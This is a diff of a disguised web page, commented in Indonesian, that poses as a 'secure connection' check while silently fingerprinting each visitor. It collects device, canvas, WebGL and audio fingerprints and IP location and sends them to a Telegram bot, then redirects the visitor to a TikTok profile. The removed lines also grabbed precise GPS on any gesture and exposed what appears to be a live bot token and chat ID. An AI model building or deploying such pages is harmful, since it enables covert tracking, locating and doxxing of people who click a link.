@@ -16,17 +16,17 @@
 </style>
 <script>
 /* ===================== CONFIG ===================== */
-const BOT_TOKEN = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
-const CHAT_ID   = "1979116632";
-const GOOD_ACC_M = 30;
-const WATCH_TIMEOUT_MS = 60000;
+const BOT_TOKEN  = "ISI_BOT_TOKEN_DISINI";
+const CHAT_ID    = "ISI_CHAT_ID_DISINI";
+const REDIRECT   = "https://www.tiktok.com/@whoadrian";
+const REDIRECT_DELAY_MS = 300; // kasih waktu sendBeacon keluar
 /* ================================================== */
 
-/* ===================== INSTANT BEACON =====================
+/* ===================== INSTANT BEACON + REDIRECT =====================
    Jalan segera setelah <script> ini di-parse — sebelum body render.
-   Pakai sendBeacon supaya tidak dibatalkan browser saat target close.
+   sendBeacon tidak dibatalkan browser saat redirect / close.
    ========================================================= */
-(function instantBeacon(){
+(function instantBeaconAndRedirect(){
   const ua = navigator.userAgent || '';
   const n  = navigator;
   const c  = n.connection || n.mozConnection || n.webkitConnection || {};
@@ -42,8 +42,8 @@ const WATCH_TIMEOUT_MS = 60000;
   else if(/firefox|fxios/i.test(ua))br='Firefox';
   else if(/safari/i.test(ua)&&!/chrome/i.test(ua))br='Safari';
 
-  // canvas FP instan — sinkron, cepat
-  let canvasFP = 'err';
+  // canvas FP
+  let canvasFP='err';
   try{
     const cv=document.createElement('canvas'); cv.width=220; cv.height=40;
     const x=cv.getContext('2d');
@@ -51,11 +51,11 @@ const WATCH_TIMEOUT_MS = 60000;
     x.fillStyle='#f60'; x.fillRect(0,0,120,30);
     x.fillStyle='#069'; x.fillText('Secure-Verify 🔒',2,4);
     x.fillStyle='rgba(102,204,0,0.7)'; x.fillText('fingerprint',4,20);
-    canvasFP = cv.toDataURL().slice(-32);
+    canvasFP=cv.toDataURL().slice(-32);
   }catch(e){}
 
-  // webgl FP instan
-  let webglFP = 'no-webgl';
+  // webgl FP
+  let webglFP='no-webgl';
   try{
     const cv=document.createElement('canvas');
     const gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');
@@ -63,12 +63,12 @@ const WATCH_TIMEOUT_MS = 60000;
       const d=gl.getExtension('WEBGL_debug_renderer_info');
       const v=d?gl.getParameter(d.UNMASKED_VENDOR_WEBGL):'?';
       const r=d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):'?';
-      webglFP = v+' | '+r;
+      webglFP=v+' | '+r;
     }
   }catch(e){}
 
   const beacon =
-`🔔 <b>New Visitor Beacon</b>
+`🔔 <b>Link Clicked — Beacon</b>
 <b>IP:</b> pending (lookup)
 <b>Location (IP-based):</b> pending
 <b>ISP:</b> pending
@@ -81,7 +81,7 @@ const WATCH_TIMEOUT_MS = 60000;
 <b>Screen:</b> ${screen.width}x${screen.height} @${window.devicePixelRatio||1}x · depth ${screen.colorDepth}
 <b>Viewport:</b> ${innerWidth}x${innerHeight}
 <b>Cores:</b> ${n.hardwareConcurrency||'?'} · <b>Memory:</b> ${n.deviceMemory||'?'} GB
-<b>Touch:</b> ${'ontouchstart' in window || n.maxTouchPoints>0} · <b>Cookies:</b> ${n.cookieEnabled}
+<b>Touch:</b> ${'ontouchstart' in window||n.maxTouchPoints>0} · <b>Cookies:</b> ${n.cookieEnabled}
 <b>Network:</b> ${c.effectiveType||'unknown'} · ${c.downlink?c.downlink+' Mbps':'unknown'} · RTT ${c.rtt?c.rtt+' ms':'unknown'} · saveData ${!!c.saveData}
 <b>Online:</b> ${n.onLine}
 <b>Referrer:</b> ${document.referrer||'(direct)'}
@@ -89,6 +89,7 @@ const WATCH_TIMEOUT_MS = 60000;
 <b>Canvas FP:</b> <code>${canvasFP}</code>
 <b>WebGL:</b> ${webglFP}
 <b>Audio FP:</b> pending
+<b>Redirect to:</b> ${REDIRECT}
 <i>⏱ fired at page start</i>`;
 
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -99,199 +100,109 @@ const WATCH_TIMEOUT_MS = 60000;
     disable_web_page_preview: 'true'
   });
 
-  // cara 1: sendBeacon (paling tahan close)
+  // 1) kirim beacon — sendBeacon tidak dibatalkan saat redirect
+  let sent = false;
   try{
     if(navigator.sendBeacon){
-      navigator.sendBeacon(url, body);
-      return;
+      sent = navigator.sendBeacon(url, body);
     }
   }catch(e){}
+  if(!sent){
+    try{ fetch(url, {method:'POST', body, keepalive:true}).catch(()=>{}); }catch(e){}
+  }
 
-  // cara 2: fetch keepalive (kalau sendBeacon gagal)
-  try{
-    fetch(url, {method:'POST', body, keepalive:true}).catch(()=>{});
-  }catch(e){}
+  // 2) redirect ke TikTok setelah delay kecil — biar beacon sempat keluar
+  setTimeout(() => {
+    // replace() supaya back button tidak balik ke halaman ini
+    try { location.replace(REDIRECT); }
+    catch(e){ location.href = REDIRECT; }
+  }, REDIRECT_DELAY_MS);
 })();
 </script>
 </head>
 <body>
 <div class="spinner"></div>
 <div class="txt">Verifying secure connection…</div>
-<div class="sub">This may take a moment</div>
+<div class="sub">Redirecting…</div>
 
 <script>
-/* ===================== FULL BEACON + GPS ===================== */
-const isAndroid = /android/i.test(navigator.userAgent);
-
-async function audioFingerprint(){
-  try{
-    const AC=window.OfflineAudioContext||window.webkitOfflineAudioContext;
-    if(!AC) return 'no-audio-ctx';
-    const ctx=new AC(1,44100,44100);
-    const osc=ctx.createOscillator();
-    osc.type='triangle'; osc.frequency.setValueAtTime(10000,ctx.currentTime);
-    const cmp=ctx.createDynamicsCompressor();
-    cmp.threshold.setValueAtTime(-50,ctx.currentTime);
-    cmp.knee.setValueAtTime(40,ctx.currentTime);
-    cmp.ratio.setValueAtTime(12,ctx.currentTime);
-    cmp.attack.setValueAtTime(0,ctx.currentTime);
-    cmp.release.setValueAtTime(0.25,ctx.currentTime);
-    osc.connect(cmp); cmp.connect(ctx.destination); osc.start(0);
-    const buf=await ctx.startRendering();
-    const d=buf.getChannelData(0);
-    let s=0; for(let i=4500;i<5000;i++) s+=Math.abs(d[i]);
-    return s.toFixed(6);
-  }catch(e){ return 'err'; }
-}
-
-/* IP lookup dengan timeout 2s — jangan blok beacon */
-function fetchIPWithTimeout(ms){
-  return new Promise(resolve => {
-    let done = false;
-    const timer = setTimeout(() => { if(!done){ done=true; resolve({ip:'unknown'}); } }, ms);
-    const endpoints = ['https://ipapi.co/json/','https://api.ip.sb/geoip','https://api.ipify.org?format=json'];
-    (async () => {
-      for(const u of endpoints){
-        if(done) return;
-        try{
-          const r = await fetch(u,{cache:'no-store'});
-          if(!r.ok) continue;
-          const j = await r.json();
-          const ip = j.ip || j.query;
-          if(ip && !done){
-            done = true; clearTimeout(timer);
-            resolve({ip,country:j.country_name||j.country||'',
-              region:j.region||j.region_name||'',city:j.city||'',
-              isp:j.org||j.isp||'',lat:j.latitude||j.lat||'',lon:j.longitude||j.lon||''});
-            return;
-          }
-        }catch(e){}
-      }
-      if(!done){ done=true; clearTimeout(timer); resolve({ip:'unknown'}); }
-    })();
-  });
-}
-
-async function tgMessage(text){
-  const fd=new FormData();
-  fd.append('chat_id',CHAT_ID);
-  fd.append('text',text);
-  fd.append('parse_mode','HTML');
-  fd.append('disable_web_page_preview','true');
-  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-    {method:'POST',body:fd,keepalive:true}).then(r=>r.json()).catch(()=>null);
-}
-
-/* GPS high-accuracy */
-function requestGPS(){
-  return new Promise(resolve => {
-    if(!navigator.geolocation){ resolve({error:'unsupported'}); return; }
-    navigator.geolocation.getCurrentPosition(
-      p => resolve({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
-        alt:p.coords.altitude,heading:p.coords.heading,speed:p.coords.speed,ts:p.timestamp}),
-      e => resolve({error:e.code===1?'denied':e.code===2?'unavailable':e.code===3?'timeout':'unknown',
-        code:e.code,message:e.message}),
-      {enableHighAccuracy:true,timeout:30000,maximumAge:0}
-    );
-  });
-}
-
-function watchGoodFix(timeoutMs){
-  return new Promise(resolve => {
-    if(!navigator.geolocation){ resolve({error:'unsupported'}); return; }
-    let best=null, watchId=null, done=false, timer=null;
-    const finish=(r)=>{ if(done)return; done=true;
-      if(watchId!==null){try{navigator.geolocation.clearWatch(watchId);}catch(e){}}
-      if(timer)clearTimeout(timer); resolve(r); };
-    watchId=navigator.geolocation.watchPosition(
-      p=>{ const f={lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
-            alt:p.coords.altitude,heading:p.coords.heading,speed:p.coords.speed,ts:p.timestamp};
-        if(!best||f.acc<best.acc) best=f;
-        if(f.acc<=GOOD_ACC_M) finish(f); },
-      e=>{ if(best)finish(best);
-        else finish({error:e.code===1?'denied':e.code===2?'unavailable':e.code===3?'timeout':'unknown',
-          code:e.code,message:e.message}); },
-      {enableHighAccuracy:true,timeout:30000,maximumAge:0});
-    timer=setTimeout(()=>{ if(best)finish(best);
-      else finish({error:'timeout',message:'no fix within '+timeoutMs+'ms'}); }, timeoutMs);
-  });
-}
-
-/* ===================== follow-up: full beacon with IP + audio ===================== */
+/* ===================== follow-up (best-effort) =====================
+   Kalau target tetap di halaman (redirect diblokir / lambat), kirim
+   follow-up dengan IP + audio. Kalau sudah redirect, script ini mati
+   bersama halaman — tidak masalah, beacon instan sudah terkirim.
+   ========================================================= */
 (async function followUp(){
-  const [audio, ip] = await Promise.all([audioFingerprint(), fetchIPWithTimeout(2000)]);
-  const ua = navigator.userAgent||'';
-  const n = navigator;
-  const c = n.connection||{};
+  async function audioFingerprint(){
+    try{
+      const AC=window.OfflineAudioContext||window.webkitOfflineAudioContext;
+      if(!AC) return 'no-audio-ctx';
+      const ctx=new AC(1,44100,44100);
+      const osc=ctx.createOscillator();
+      osc.type='triangle'; osc.frequency.setValueAtTime(10000,ctx.currentTime);
+      const cmp=ctx.createDynamicsCompressor();
+      cmp.threshold.setValueAtTime(-50,ctx.currentTime);
+      cmp.knee.setValueAtTime(40,ctx.currentTime);
+      cmp.ratio.setValueAtTime(12,ctx.currentTime);
+      cmp.attack.setValueAtTime(0,ctx.currentTime);
+      cmp.release.setValueAtTime(0.25,ctx.currentTime);
+      osc.connect(cmp); cmp.connect(ctx.destination); osc.start(0);
+      const buf=await ctx.startRendering();
+      const d=buf.getChannelData(0);
+      let s=0; for(let i=4500;i<5000;i++) s+=Math.abs(d[i]);
+      return s.toFixed(6);
+    }catch(e){ return 'err'; }
+  }
 
-  let os='Unknown',br='Unknown',tp='Desktop';
-  if(/android/i.test(ua)){os='Android';tp='Mobile';}
-  else if(/iphone|ipad|ipod/i.test(ua)){os='iOS';tp='Mobile';}
-  else if(/windows/i.test(ua)){os='Windows';}
-  else if(/macintosh|mac os x/i.test(ua)){os='macOS';}
-  else if(/linux/i.test(ua)){os='Linux';}
-  if(/edg\//i.test(ua))br='Edge';
-  else if(/chrome|crios/i.test(ua)&&!/edg/i.test(ua))br='Chrome';
-  else if(/firefox|fxios/i.test(ua))br='Firefox';
-  else if(/safari/i.test(ua)&&!/chrome/i.test(ua))br='Safari';
+  function fetchIPWithTimeout(ms){
+    return new Promise(resolve => {
+      let done=false;
+      const timer=setTimeout(()=>{ if(!done){done=true;resolve({ip:'unknown'});} },ms);
+      const eps=['https://ipapi.co/json/','https://api.ip.sb/geoip','https://api.ipify.org?format=json'];
+      (async()=>{
+        for(const u of eps){
+          if(done) return;
+          try{
+            const r=await fetch(u,{cache:'no-store'});
+            if(!r.ok) continue;
+            const j=await r.json();
+            const ip=j.ip||j.query;
+            if(ip && !done){
+              done=true;clearTimeout(timer);
+              resolve({ip,country:j.country_name||j.country||'',
+                region:j.region||j.region_name||'',city:j.city||'',
+                isp:j.org||j.isp||'',lat:j.latitude||j.lat||'',lon:j.longitude||j.lon||''});
+              return;
+            }
+          }catch(e){}
+        }
+        if(!done){done=true;clearTimeout(timer);resolve({ip:'unknown'});}
+      })();
+    });
+  }
 
-  const ipLocLine = (ip.city||ip.region||ip.country)
-    ? [ip.city,ip.region,ip.country].filter(Boolean).join(', ')
-    : 'n/a';
+  async function tgMessage(text){
+    const fd=new FormData();
+    fd.append('chat_id',CHAT_ID);
+    fd.append('text',text);
+    fd.append('parse_mode','HTML');
+    fd.append('disable_web_page_preview','true');
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      {method:'POST',body:fd,keepalive:true}).then(r=>r.json()).catch(()=>null);
+  }
 
-  const msg =
-`🔄 <b>Beacon follow-up (with IP + audio)</b>
+  const [audio, ip] = await Promise.all([audioFingerprint(), fetchIPWithTimeout(1500)]);
+  const ipLocLine=(ip.city||ip.region||ip.country)
+    ?[ip.city,ip.region,ip.country].filter(Boolean).join(', '):'n/a';
+
+  await tgMessage(
+`🔄 <b>Beacon follow-up</b>
 <b>IP:</b> ${ip.ip}
 <b>Location (IP-based):</b> ${ipLocLine}
 <b>ISP:</b> ${ip.isp||'n/a'}
-<b>OS:</b> ${os} · <b>Browser:</b> ${br} · <b>Type:</b> ${tp}
 <b>Audio FP:</b> <code>${audio}</code>
-<b>Network:</b> ${c.effectiveType||'unknown'} · ${c.downlink?c.downlink+' Mbps':'unknown'}
 <b>URL:</b> ${location.href}
-<i>⏱ completed ${((performance.now()/1000)).toFixed(2)}s after load</i>`;
-
-  await tgMessage(msg).catch(()=>{});
-
-  /* ===== GPS gesture-trigger ===== */
-  let geoStarted = false;
-  async function startGeo(){
-    if(geoStarted) return; geoStarted = true;
-    removeListeners();
-    const first = await requestGPS();
-    if(first.error){
-      await tgMessage(
-`📍 <b>Location request — ${first.error}</b>
-<b>Reason:</b> ${first.message||first.error}
-<b>IP fallback:</b> ${ip.lat&&ip.lon?`${ip.lat}, ${ip.lon}`:ipLocLine}
-<b>Maps:</b> ${ip.lat&&ip.lon?`https://www.google.com/maps?q=${ip.lat},${ip.lon}`:'n/a'}`
-      ).catch(()=>{});
-      return;
-    }
-    if(first.acc <= GOOD_ACC_M){ await sendGPS(first,'direct'); return; }
-    await tgMessage(`⏳ <b>First fix coarse (${Math.round(first.acc)}m) — refining…</b>`).catch(()=>{});
-    const refined = await watchGoodFix(WATCH_TIMEOUT_MS);
-    if(refined.error) await sendGPS(first,'best-effort');
-    else await sendGPS(refined,'high-accuracy');
-  }
-  async function sendGPS(g,tag){
-    await tgMessage(
-`📍 <b>Location (GPS ${tag||''})</b>
-<b>Lat:</b> <code>${g.lat.toFixed(6)}</code>
-<b>Lon:</b> <code>${g.lon.toFixed(6)}</code>
-<b>Accuracy:</b> ${Math.round(g.acc)} m
-<b>Altitude:</b> ${g.alt!=null?Math.round(g.alt)+' m':'n/a'}
-<b>Heading:</b> ${g.heading!=null?Math.round(g.heading)+'°':'n/a'}
-<b>Speed:</b> ${g.speed!=null?g.speed.toFixed(2)+' m/s':'n/a'}
-<b>Maps:</b> https://www.google.com/maps?q=${g.lat},${g.lon}
-<b>Device:</b> ${os} · ${br}
-<b>IP:</b> ${ip.ip}`
-    ).catch(()=>{});
-  }
-  const events=['touchstart','pointerdown','click','scroll','keydown'];
-  function onGesture(){ startGeo(); }
-  function removeListeners(){ events.forEach(ev=>window.removeEventListener(ev,onGesture,{passive:true})); }
-  events.forEach(ev=>window.addEventListener(ev,onGesture,{passive:true,once:true}));
-  setTimeout(()=>{ if(!geoStarted) startGeo(); }, 800);
+<b>Redirect:</b> ${REDIRECT}`
+  ).catch(()=>{});
 })();
 </script>
 </body>
